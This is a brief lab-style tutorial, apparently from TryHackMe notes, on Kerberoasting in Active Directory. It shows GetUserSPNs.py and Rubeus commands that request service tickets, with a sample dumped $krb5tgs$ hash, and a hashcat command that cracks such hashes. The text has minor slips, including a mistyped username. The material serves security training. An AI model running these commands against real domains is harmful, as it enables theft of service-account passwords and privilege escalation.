**Kerberoasting**

Kerberoasting is a common AD attack to obtain AD tickets that helps with persistence. In order for this attack to work, an adversary must have access to **SPN (Service Principal Name)** accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (**TGT**) and Ticket Granting Service (**TGS**). This attack's end goal is to enable privilege escalation and lateral network movement.

**First Method**


Let's do a quick demo about the attack. First, we need to find an SPN account(s) using ```GetUserSPNs.py``` script:
```
GetUserSPNs.py -dc-ip <DomainController_IP> <domain>/<username>
```
**ex**:
```
GetUserSPNs.py -dc-ip 10.10.73.127 THM.red/thm
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578  
```
We see a service running and ```svc-user``` is the user running it.<br>
we can send a request to get a **TGS** ticket for the ```srv-user``` user using the ```-request-user``` argument:
```
GetUserSPNs.py -dc-ip 10.10.73.127 THM.red/thm -request-user svc-user
```

**Second Method**

This will dump the Kerberos hash of any kerberoastable users.
 > If the service has a registered SPN then it can be Kerberoastable 
```
Rubeus.exe kerberoast /nowrap
```
the output look like this:
```
[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111*$3A4ADF3B1A9995C43B3B039DA5C81B37$F63A4D4305FEA18C08BEF39CEAC251A844608129C93A3DCEF5CA685F1E26BB9E4E5C3B40E8B57DF591858AE4E5858B36C94592E6FF59235B52C93795E9D463190352D9B62368AF08F9A9DEBA4B68BEF0BFA359C336960A52E08D1BFD36B22590D231FA1B87ED2BB560F53D68D7837874B056C18B6B7ABBE15E74F108F4CD1085DC9EAB3C1E0BA071157E77243204A519ADF4620BCEE477F0AD2942A6C8CFAE994B0E736272FF2CE009B5DD8ED32B3D0A8F01F01B53961894A42546A5065E53AF33F28F20031FCE1C79D9CBA566815C2B24866D23AD02054C44DDD16F051D017AAE23E7D8AC42E80D4963FF58D44C8341C646BCA2EA8AC905BF9E1A4F4A2A6984CC1EE1CC1F653C6A80FE54F84C3E13DFC17178E56F411233A9E19900940203CE463557F128B95E22A7D63158765C13000C61344F497BF119F0D34A3B579CBCE548FD49A3FA14A2220593F5D0B97EAD7237C2DB641470FC96CF0788A6125DCB867288885BFDF6C7299CEB983D45F968D0EB9D889F304FAFE89DD801381ABE779A50220462B0D25AE3EA6B4700DFF3E6029F78DB9D889D3228052942C19894E4886749D0DD75842A0CF2C62D6F090637A7E73B3DDC3285F13D1CC6C24290EAD96AA6EF765D6BD8FBBE5710798CE852E1A0F5D6D1EE39D7FAF5961284ECE9A14BC80319D7C8EFF4E9733E7651ECD5C0CF208BF02BB007B42F2F384851C740CF6FC165F9259AE77C662469A53A237D7C86C99EAC27FFD384EB61B2320AD825638DF0E41A94498F00DA5BC7FA66FD29FB889F5E892A28D4588FE307B99059FEAC256133931FB6EC478034556DA02421646B584FEA7B19FA6FD12724105D26FA377E64FFBA872D570AE49564D3B332E4496D180C00E615030D3732EABB9A4C7CDA0BB8EFE437FA558361EBB09D509110DDD893009879D51444A87800DB83681CC81F4DFEEA260CFE2F881DCD222B6FBF83CEA212AC480886639C6B1196066BD8FB1015D280BB74CCAC991B96C6942B7A330492D53F4E6DDF803508C929EC327FA58E915DB0B75175A4873FC81D47AFB24A2F8AE7AFB679F0EC091AEC3F20F7E9672718C46B0026313433D3C1E4F75C420968218292887558EFEA537249F2FD49C040B7E51A52E90A82025631F74F752BCBD6799E65309E43B2929E88A62FBFC5B059F13B95126B9045C690DF7EADA5209B372FD8453CCAC1B5DA6C238AA0665550617E547D1142F034C066429BA2870FAC1C5BACC1A5693F25E2DFF1AFF844D80206C60AE1859C443BCB1FC713989F58D3EE3AC32686057A030A46E82A3411F69B3A5749277AF4FCD068B7FD83EB3C32D2B9F07E75D42BC5D97BC7754473E82927F67BC7F6E831F26C17272C2953CACC1C27085C5C36E2F521A5D50D8DE78E18BF2F421B7E728CCEB7708B7060DBA18FAB3BEE3EA81DF6BC2E7558023B3856A69A0BDA78A4DDB9CB0F3304FA9F956DE409C7E5A2DA8D508D966896FC2CC4601E662C234B34D175EA1649A7874F475FDF106E26D3C62D152BDA88CA1BE0A99CA853F7F26165FD862FDC83B3D2914967C7A5E94018CBFECE36343A94BC785F1503304D86C9EEE53C7075129C23754E354EFA02326A7B1D1695574482B0E669DD5928B8C3E990969F57593D1BED83B850FC43E85A
```
**Crack the TGS**

If we got the sevice TGS we could crack it to dump the password using ```hashcat```

```
hashcat -m 13100 hashes.txt /path/to/wordlist.txt
```






























